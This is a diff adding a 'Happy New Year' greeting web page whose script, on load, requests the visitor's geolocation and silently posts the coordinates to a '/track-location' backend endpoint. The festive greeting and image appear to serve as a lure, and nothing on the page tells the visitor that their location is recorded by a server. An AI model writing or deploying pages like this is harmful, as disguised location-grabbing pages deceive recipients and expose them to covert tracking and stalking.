@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Happy New Year!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #f3f4f6;
+            margin: 0;
+            padding: 0;
+        }
+        .greeting-container {
+            margin-top: 50px;
+        }
+        .greeting-image {
+            width: 80%;
+            max-width: 600px;
+            margin-top: 20px;
+        }
+        .loading {
+            font-size: 18px;
+            color: #333;
+            margin-top: 20px;
+        }
+        .error {
+            color: red;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="greeting-container">
+        <h1>Happy New Year!</h1>
+        <p>We're wishing you a year full of happiness and success!</p>
+        <img class="greeting-image" src="https://plus.unsplash.com/premium_photo-1663840297088-5b76140d74ba?fm=jpg&q=60&w=3000&ixlib=rb-4.1.0&ixid=M3wxMjA3fDB8MHxzZWFyY2h8MXx8aGFwcHklMjBuZXclMjB5ZWFyfGVufDB8fDB8fHww" alt="Happy New Year">
+        <p class="loading" id="loadingMessage">Getting your location...</p>
+        <p class="error" id="errorMessage"></p>
+    </div>
+
+    <script>
+        function sendLocationToBackend(latitude, longitude) {
+            fetch('/track-location', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ latitude, longitude })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Location sent successfully:', data);
+            })
+            .catch(error => {
+                console.error('Error sending location:', error);
+            });
+        }
+
+        function handleGeoSuccess(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+
+            document.getElementById('loadingMessage').style.display = 'none'; // Hide loading text
+
+            sendLocationToBackend(latitude, longitude);
+        }
+
+        function handleGeoError(error) {
+            document.getElementById('loadingMessage').style.display = 'none'; // Hide loading text
+            document.getElementById('errorMessage').textContent = "Unable to retrieve your location. Please try again.";
+        }
+
+        if ("geolocation" in navigator) {
+            navigator.geolocation.getCurrentPosition(handleGeoSuccess, handleGeoError);
+        } else {
+            document.getElementById('loadingMessage').style.display = 'none';
+            document.getElementById('errorMessage').textContent = "Geolocation is not supported by your browser.";
+        }
+    </script>
+</body>
+</html>
